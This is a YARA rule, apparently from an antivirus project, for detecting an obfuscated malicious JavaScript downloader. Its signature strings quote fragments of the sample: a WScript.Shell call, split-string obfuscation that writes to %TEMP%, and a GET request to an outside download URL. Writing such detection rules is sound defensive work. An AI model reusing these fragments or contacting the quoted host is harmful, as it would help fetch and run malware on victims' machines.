rule sig_20160427_5f42aca8e0d1c8868cf8c6ce63b8a2a8 {
  meta:
    description = "datamaliciousorder - file 20160427_5f42aca8e0d1c8868cf8c6ce63b8a2a8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0a5d8efa11abda2a2ad2b90cff3867f67192789234e3ca56ad10e7c40ef9913e"

  strings:
    $s1  = "function IfiruVmwsi() {return OhpczXnxxw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"tsF3a92" ascii
    $s2  = "function IfiruVmwsi() {return OhpczXnxxw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"tsF3a92" ascii
    $s3  = "var OhpczXnxxw = function IsylrDparo() {return ZdyzvLaksy[HcjegSrxza](\"WScript\"+\".Shell\");}(), ZfchwYcwxn = 11;" fullword ascii
    $s4  = "function AnlieXmdbb(KnrkuKofmu, FlghoWbvrh){BsnixEzeyh = BsnixEzeyh * 1; return KnrkuKofmu - FlghoWbvrh;};" fullword ascii
    $s5  = "AdolkBaskh[CrkddZlynb](\"G\" + \"ET\", \"http://lbbc.pt/n8wisd\", false);" fullword ascii
    $s6  = "var ZdyzvLaksy = this[\"WScript\"];" fullword ascii
    $s7  = "function GuzlwFsuui(){return JiefeFkxbx + \"\";};" fullword ascii
    $s8  = "if (AdolkBaskh[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function YfvckBjrjd() {return ((RnscrJpirn == true) && (RnscrJpirn == MqzzhYnmzt)) ? 1 : BsnixEzeyh;};" fullword ascii
    $s10 = "function TdefaHcsyp(){return 23;};" fullword ascii
    $s11 = "function XjgryCtrbz()" fullword ascii
    $s12 = "WlyrqKsrbh = true;" fullword ascii
    $s13 = "RnscrJpirn = true; " fullword ascii
    $s14 = "var QnafiBmwfd = new this[\"D\"+\"ate\"]();" fullword ascii
    $s15 = "return AnlieXmdbb(PcyliPtpij, HzsikWqrpj);" fullword ascii
    $s16 = "var MqzzhYnmzt = false;" fullword ascii
    $s17 = "}while (ExrwiMmecw);" fullword ascii
    $s18 = "MqzzhYnmzt = true; " fullword ascii
    $s19 = "function LchzmCgsmb(ChjkgCspkk) {var SortfFdfqv = (1, 2, 3, 4, 5, ChjkgCspkk); return SortfFdfqv;};" fullword ascii
    $s20 = "function HvhomVixpj(){return HcjegSrxza;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}